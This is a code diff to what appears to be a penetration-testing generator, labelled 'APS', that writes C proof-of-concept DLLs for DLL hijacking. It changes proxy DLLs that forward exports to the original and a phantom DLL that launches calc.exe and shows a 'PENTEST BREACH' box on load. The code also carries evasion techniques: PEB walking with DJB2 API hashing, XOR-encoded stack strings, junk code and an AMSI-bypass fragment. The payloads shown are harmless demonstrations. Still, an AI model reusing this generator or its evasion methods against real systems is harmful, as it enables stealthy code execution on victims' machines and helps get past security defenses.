@@ -366,7 +366,7 @@ try {{ [Ref].Assembly.GetType("System.Management.Automation."+[string]::new([cha
         key_u   = random.randint(0x11, 0xEF)
         u32_e   = ",".join([f"0x{ord(c)^key_u:02x}" for c in "user32.dll"])
         key_t   = random.randint(0x11, 0xEF)
-        title_r = "\u26a0 PENTEST BREACH [APS]"
+        title_r = "[!] PENTEST BREACH [APS]"
         title_e = ",".join([f"0x{ord(c)^key_t:02x}" for c in title_r])
         junk1   = self._junk()
         junk2   = self._junk()
@@ -383,6 +383,18 @@ try {{ [Ref].Assembly.GetType("System.Management.Automation."+[string]::new([cha
  *            + Sandbox Gate + XOR Stack Strings
  * ============================================================ */
 
+// Extended LDR entry (winternl.h has incomplete definition)
+typedef struct _APS_LDR_ENTRY {{
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+}} APS_LDR_ENTRY;
+
 // ── DJB2 Hasher ─────────────────────────────────────────────
 static ULONG32 _h(const char* s){{ULONG32 h=5381;unsigned char c;while((c=(unsigned char)*s++))h=((h<<5)+h)+c;return h;}}
 static ULONG32 _hw(const wchar_t* s){{ULONG32 h=5381;wchar_t c;while((c=*s++))h=((h<<5)+h)+(unsigned char)c;return h;}}
@@ -391,7 +403,7 @@ static ULONG32 _hw(const wchar_t* s){{ULONG32 h=5381;wchar_t c;while((c=*s++))h=
 static HMODULE _gmod(ULONG32 nh){{
     PEB*p=(PEB*)__readgsqword(0x60);LIST_ENTRY*hd=&p->Ldr->InMemoryOrderModuleList;
     for(LIST_ENTRY*e=hd->Flink;e!=hd;e=e->Flink){{
-        LDR_DATA_TABLE_ENTRY*m=CONTAINING_RECORD(e,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
+        APS_LDR_ENTRY*m=CONTAINING_RECORD(e,APS_LDR_ENTRY,InMemoryOrderLinks);
         if(m->FullDllName.Buffer&&_hw(m->BaseDllName.Buffer)==nh)return(HMODULE)m->DllBase;
     }}return NULL;
 }}
@@ -541,8 +553,8 @@ static DWORD WINAPI _popup_worker(LPVOID lp){{
     for(int i=0;i<10;i++) _u32[i]^=0x{key_u:02x};
     HMODULE hu=_ll((char*)_u32);if(!hu)hu=_gmod({h_user32});
     if(hu){{
-        unsigned char _t[]={{{title_e}}};
-        for(int i=0;i<{len(title_r)};i++) _t[i]^=0x{key_t:02x}; _t[{len(title_r)}]=0;
+        unsigned char _t[]={{{title_e},0}};
+        for(int i=0;i<{len(title_r)};i++) _t[i]^=0x{key_t:02x};
         typedef int(WINAPI*fnMB)(HWND,LPCSTR,LPCSTR,UINT);
         fnMB fMB=(fnMB)_gproc(hu,{h_msgbox});
         if(fMB)fMB(NULL,a?a->msg:"APS PoC",(char*)_t,MB_OK|MB_ICONWARNING|MB_TOPMOST|MB_SETFOREGROUND);
@@ -763,13 +775,13 @@ HMODULE GetModH(unsigned long hash) {
         : "=r" (peb)
     );
     
-    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
+    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InLoadOrderModuleList.Flink;
     while (entry) {
-        if (entry->FullDllName.Buffer) {
+        if (entry->BaseDllName.Buffer) {
             char name[256];
             int i = 0;
-            while (entry->FullDllName.Buffer[i] && i < 255) {
-                char c = (char)entry->FullDllName.Buffer[i];
+            while (entry->BaseDllName.Buffer[i] && i < 255) {
+                char c = (char)entry->BaseDllName.Buffer[i];
                 if (c >= 'a' && c <= 'z') c -= 32; // To Upper
                 name[i] = c;
                 i++;
@@ -777,8 +789,8 @@ HMODULE GetModH(unsigned long hash) {
             name[i] = 0;
             if (Hash(name) == hash) return (HMODULE)entry->DllBase;
         }
-        entry = (PLDR_DATA_TABLE_ENTRY)entry->InMemoryOrderLinks.Flink;
-        if (entry == (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink) break;
+        entry = (PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
+        if (entry == (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InLoadOrderModuleList.Flink) break;
     }
     return NULL;
 }
@@ -914,7 +926,7 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
             cmd.extend(["-luser32", "-lkernel32", "-ladvapi32"])
 
         try:
-            res = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+            res = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
             if res.returncode == 0:
                 print(f"  {Fore.GREEN}[SUCCESS]  Auto-Compiled: {os.path.basename(out_path)} (via {self._compiler_type}){Style.RESET_ALL}")
                 return True
@@ -1002,16 +1014,25 @@ BOOL WINAPI DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
         exports  = v_res.get("required_exports", [])
         is_phantom = v_res.get("is_phantom", False)
 
+        exe_imports = v_res.get("exe_imports", [])
+
         if is_phantom:
-            return self._gen_phantom_dll({"dll_name": dll_name})
+            return self._gen_phantom_dll({"dll_name": dll_name, "dll_exports": exe_imports})
 
         orig_dll = dll_name.replace(".dll", "_original.dll")
+        orig_base = orig_dll.replace(".dll", "")
 
-        # .def file
+        # Merge: DLL export table + EXE import table (dedup)
+        all_exports = list(dict.fromkeys(exports + exe_imports))
+
+        # .def file — use forwarding syntax to route calls to original DLL
         self._ensure_output_dir()
         def_fname = self._get_prefixed_name(f"proxy_{dll_name.replace('.dll','')}.def")
         with open(os.path.join(self.output_dir, def_fname), "w") as f:
-            f.write("EXPORTS\n" + "\n".join(exports))
+            lines = ["EXPORTS"]
+            for exp in all_exports:
+                lines.append(f"    {exp}={orig_base}.{exp}")
+            f.write("\n".join(lines))
 
         # .c file (GHOST-PROTOCOL v2)
         core = self._ghost_core_c(dll_name)
@@ -1484,41 +1505,32 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     #  TẦNG 4: DLL Hijacking (VEC 031-040)
     # ==================================================================
     def _gen_phantom_dll(self, finding):
-        """APS-VEC-032: Phantom DLL PoC (Tier-4: Total Silence)"""
+        """APS-VEC-032: Phantom DLL PoC (Standard WinAPI - reliable)"""
         dll_name = finding.get('dll_name', 'phantom.dll')
+        dll_exports = finding.get('dll_exports', [])
         
-        h_kernel32 = "0x6ddb9555"
-        h_user32   = "0x2208cf13"
-        h_winexec  = "0x29a65678"
-        h_msgbox   = "0x384f14b4"
+        # Generate stub exports for all functions the EXE expects from this DLL
+        export_stubs = ""
+        if dll_exports:
+            export_stubs += "\n// [APS] Stub exports to satisfy IAT of target EXE\n"
+            for func_name in dll_exports:
+                export_stubs += f"__declspec(dllexport) void {func_name}(void) {{ return; }}\n"
+        
+        code = f"""#include <windows.h>
 
-        core = self._get_ghost_protocol_v4_header()
-        body = f"""
-typedef UINT (WINAPI* pWinExec)(LPCSTR, UINT);
-typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);
+{export_stubs}
 
-BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
+BOOL WINAPI DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
-        {self._get_junk_code()}
-        HMODULE hK32 = GetModH({h_kernel32});
-        HMODULE hU32 = GetModH({h_user32});
-        
-        pWinExec _WinExec = (pWinExec)GetProcH(hK32, {h_winexec});
-        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
-        
-        char c[9];
-        c[0]='c'; c[1]='a'; c[2]='l'; c[3]='c'; c[4]='.'; c[5]='e'; c[6]='x'; c[7]='e'; c[8]=0;
-        if (_WinExec) _WinExec(c, 1);
-        
-        char m[16];
-        m[0]='P'; m[1]='h'; m[2]='a'; m[3]='n'; m[4]='t'; m[5]='o'; m[6]='m'; m[7]=' '; 
-        m[8]='S'; m[9]='u'; m[10]='c'; m[11]='c'; m[12]='e'; m[13]='s'; m[14]='s'; m[15]=0;
-        if (_msgbox) _msgbox(NULL, m, m, 0x40);
+        WinExec("calc.exe", SW_SHOW);
+        MessageBoxA(NULL, "Phantom Success", "[APS] PENTEST BREACH", MB_ICONWARNING);
     }}
     return TRUE;
 }}
 """
-        self._write_c(f"phantom_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True, tier4=True)
+        # Use the exact DLL name (not prefixed) so the output matches what the EXE expects
+        out_name = dll_name.replace('.dll', '')
+        self._write_c(f"{out_name}.c", code, compile_to_dll=True, tier4=False)
         return True
 
     def _gen_t4_knowndlls_bypass(self, finding):
